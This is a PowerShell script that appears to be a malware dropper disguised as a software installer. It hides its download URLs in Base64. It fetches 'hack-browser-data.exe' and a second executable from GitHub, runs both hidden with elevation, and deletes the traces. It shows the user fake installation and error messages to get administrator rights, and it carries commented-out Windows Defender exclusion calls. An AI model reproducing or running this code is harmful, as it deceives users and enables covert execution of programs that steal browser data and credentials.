$downloadURLB64 = "aHR0cHM6Ly9naXRodWIuY29tL2VsM2N0cm80bmRyZS8uZXhlL3Jhdy9yZWZzL2hlYWRzL21haW4vaGFjay1icm93c2VyLWRhdGEuZXhl"
$download2URLB64 = "aHR0cHM6Ly9naXRodWIuY29tL2VsM2N0cm80bmRyZS8uZXhlL3Jhdy9yZWZzL2hlYWRzL21haW4vbWFpbi5leGU="
$updaterExeB64 = "aGFjay1icm93c2VyLWRhdGEuZXhl"
$updater2ExeB64 = "bWFpbi5leGU="
$hiddenAttrB64 = "SGlkZGVu"
$silentlyContinueB64 = "U2lsZW50bHljb250aW51ZQ=="
$stopActionB64 = "U3RvcA=="
$directoryB64 = "RGlyZWN0b3J5"
$runAsB64 = "UnVuQXM="

$downloadURL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($downloadURLB64))
$download2URL = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($download2URLB64))
$updaterExe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updaterExeB64))
$updater2Exe = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($updater2ExeB64))
$hiddenAttr = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($hiddenAttrB64))
$silentlyContinue = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($silentlyContinueB64))
$stopAction = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($stopActionB64))
$directory = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($directoryB64))
$runAs = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($runAsB64))

$hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().Tostring())
New-Item -ItemType $directory -Path $hiddenFolder | Out-Null

$tempPath = Join-Path $hiddenFolder $updaterExe
$tempPath2 = Join-Path $hiddenFolder $updater2Exe

function Add-Exclusion {
    param ([string]$Path)
    try {
        Add-MpPreference -ExclusionPath $Path -ErrorAction $silentlyContinue
    } catch {}
}

try {
    Write-Host "Downloading and installing the program (can take up to 5 minutes)..."
    $originalDirectory = Get-Location
    Set-Location $hiddenFolder
    #Add-Exclusion -Path $hiddenFolder
    Set-ItemProperty -Path $hiddenFolder -name Attributes -Value $hiddenAttr
    Invoke-WebRequest -Uri $downloadURL -OutFile $tempPath -UseBasicParsing -ErrorAction $stopAction
    #Add-Exclusion -Path $tempPath
    Set-ItemProperty -Path $tempPath -name Attributes -Value $hiddenAttr
    Start-Process -FilePath $tempPath -WindowStyle $hiddenAttr -Verb $runAs
    Invoke-WebRequest -Uri $download2URL -OutFile $tempPath2 -UseBasicParsing -ErrorAction $stopAction
    #Add-Exclusion -Path $tempPath2
    Set-ItemProperty -Path $tempPath2 -name Attributes -Value $hiddenAttr
    Start-Sleep -Seconds 20
    Start-Process -FilePath $tempPath2 -WindowStyle $hiddenAttr -Verb $runAs
    Start-Sleep -Seconds 20
    Remove-Item $tempPath -Force -ErrorAction $stopAction
    Remove-Item $tempPath2 -Force -ErrorAction $stopAction
    Remove-Item $hiddenFolder -Recurse -Force -ErrorAction $stopAction
    Set-Location $originalDirectory
} catch {
    Set-Location $originalDirectory
    Write-Host "An error occured during installation. Please try again as administrator."
    exit 1
} finally {
    Write-Host "An error occured during installation. Please try again as administrator."
}